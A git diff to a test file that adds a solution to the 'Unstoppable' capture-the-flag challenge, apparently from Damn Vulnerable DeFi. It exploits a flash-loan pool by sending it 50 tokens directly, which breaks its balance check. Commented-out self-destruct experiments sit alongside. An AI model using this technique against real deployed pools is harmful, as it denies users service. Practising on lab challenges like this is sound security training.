@@ -39,7 +39,34 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
+        const abi = [
+            "function approve(address spender, uint256 amount) public returns (bool)",
+            "function transfer(address recipient, uint256 amount) public returns (bool)"
+        ]
+        const Dabi = [
+            "function selfDestruct(address tokenAddress) external"
+        ]
         /** CODE YOUR EXPLOIT HERE */
+        // const Destruct = await ethers.getContractFactory('SelfDestruct', attacker.address);
+        // const destruct = await Destruct.deploy(this.pool.address);
+        const token = new ethers.Contract(this.token.address, abi, attacker);
+        await token.transfer(this.pool.address, 50);
+        // const destruction = new ethers.Contract(destruct.address, Dabi, attacker);
+        // await token.approve(destruct.address, 5)
+        // console.log("here");
+        // await token.transfer(destruct.address, 5);  
+        // const Dbalance = await this.token.balanceOf(destruct.address);
+        // const Abalance = await this.token.balanceOf(attacker.address);
+        // console.log("D balance: ", ethers.utils.formatEther(Dbalance), "A balance: ", ethers.utils.formatEther(Abalance));
+        // await this.token.transferFrom(attacker, this.receiverContract.address, 100);
+        // const PbalanceBefore = await this.token.balanceOf(this.pool.address);
+        // await destruct.selfDestruct(this.pool.address);
+        // const Pbalanceafter = await this.token.balanceOf(this.pool.address);
+        // console.log("before: ", ethers.utils.formatEther(PbalanceBefore), "after: ", ethers.utils.formatEther(Pbalanceafter));
+
+        // const Attacker = await ethers.getContractFactory('ReceiverUnstoppable', attacker);
+        // this.attackerContract = await Attacker.deploy(this.pool.address);
+        // await this.attackerContract.executeFlashLoan(50)
     });
 
     after(async function () {
